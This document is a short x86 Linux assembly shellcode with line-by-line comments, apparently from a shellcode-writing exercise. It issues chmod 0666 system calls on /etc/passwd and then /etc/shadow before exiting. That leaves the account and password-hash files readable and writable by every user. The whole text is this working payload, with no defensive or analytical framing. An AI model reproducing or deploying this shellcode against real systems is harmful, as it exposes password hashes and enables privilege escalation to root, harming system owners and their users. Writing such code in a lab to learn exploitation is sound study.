global _start

section .text

_start:
	xor ecx, ecx			;; Clear ECX
	mul ecx				;; Clear EAX, EBX, EDX

	mov cx, 0x1b6			;; Store CHMOD Flags in ECX
	push eax			;; Push null bytes

	push dword 0x64777373		;; Push /etc//passwd (Part #3)
	push dword 0x61702f2f		;; Push /etc//passwd (Part #2)
	push dword 0x6374652f		;; Push /etc//passwd (Part #1)
	mov ebx, esp			;; Store address of filepath in EBX

chmod:
	mov al, 0xf			;; Store syscall # of chmod in EAX
	int 0x80			;; Syscall Interrupt, as in chmod(filepath, 666)
	cmp dl, 1			;; Check if EDX contains a 1
	jz short exit			;; If EDX contained a 1, exit
	
	add esp, 12			;; Rewind stack to update file path (change //passwd to //shadow

	push dword 0x776f6461		;; Push //shadow (Part #2)
	push dword 0x68732f2f		;; Push //shadow (Part #1)
	inc edx				;; Increment EDX, time to exit
	jmp short chmod			;; Run Chmod (and exit)

exit:
	push edx			;; Push 1 from EDX
	pop eax				;; Store 1 in EAX
	int 0x80			;; Syscall Interrupt, as in exit(status)
